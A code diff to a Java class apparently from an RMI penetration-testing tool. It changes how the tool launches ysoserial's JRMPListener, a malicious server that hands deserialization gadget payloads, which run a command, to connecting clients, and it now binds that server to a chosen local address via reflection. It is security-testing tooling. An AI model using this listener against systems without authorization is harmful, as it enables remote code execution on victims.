@@ -1,11 +1,20 @@
 package de.qtc.rmg.utils;
 
 import java.io.File;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.net.InetAddress;
 import java.net.MalformedURLException;
+import java.net.NetworkInterface;
+import java.net.ServerSocket;
+import java.net.SocketException;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.net.UnknownHostException;
 import java.util.Arrays;
+
+import javax.net.ServerSocketFactory;
 
 import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.io.Logger;
@@ -44,19 +53,54 @@ public class YsoIntegration {
         return new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
     }
 
-    public static void createJRMPListener(String ysoPath, String port, String gadget, String command)
+    private static InetAddress getLocalAddress(String host)
+    {
+
+        InetAddress addr = null;
+
+        try {
+            addr = InetAddress.getByName(host);
+            if (!addr.isAnyLocalAddress() && !addr.isLoopbackAddress())
+                NetworkInterface.getByInetAddress(addr);
+
+        } catch (SocketException | UnknownHostException e) {
+            Logger.eprintlnMixedYellow("Specified address", host, "seems not to be available on your host.");
+            Logger.eprintlnMixedBlue("Listener address is expected to be", "bound locally.");
+            ExceptionHandler.showStackTrace(e);
+            RMGUtils.exit();
+        }
+
+        return addr;
+    }
+
+    public static void createJRMPListener(String ysoPath, String host, int port, String gadget, String command)
     {
         try {
+            InetAddress bindAddress = getLocalAddress(host);
             URLClassLoader ucl = getClassLoader(ysoPath);
 
             Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
-            Method method = yso.getDeclaredMethod("main", new Class[] {String[].class});
+            Constructor<?> cons = yso.getConstructor(new Class[] {int.class, Object.class});
+            Method runMethod = yso.getDeclaredMethod("run", new Class[] {});
 
-            Logger.printMixedYellow("Creating a", "JRMPListener", "on port ");
-            Logger.printlnPlainBlue(port + ".");
+            Field serverSocket = yso.getDeclaredField("ss");
+            serverSocket.setAccessible(true);
+
+            Logger.printMixedYellow("Creating a", "JRMPListener", "on ");
+            Logger.printlnPlainBlue(host + ":" + port + ".");
+
+            Object payloadObject = getPayloadObject(ysoPath, gadget, command);
+            Object jrmpListener = cons.newInstance(port, payloadObject);
+
+            ServerSocket serverSock = (ServerSocket) serverSocket.get(jrmpListener);
+            serverSock.close();
+
+            serverSock = ServerSocketFactory.getDefault().createServerSocket(port, 0, bindAddress);
+            serverSocket.set(jrmpListener, serverSock);
+
             Logger.printlnMixedBlue("Handing off to", "ysoserial...");
 
-            method.invoke(null, new Object[] {new String[] {port, gadget, command}});
+            runMethod.invoke(jrmpListener, new Object[] {});
             System.exit(0);
 
         } catch( Exception e ) {
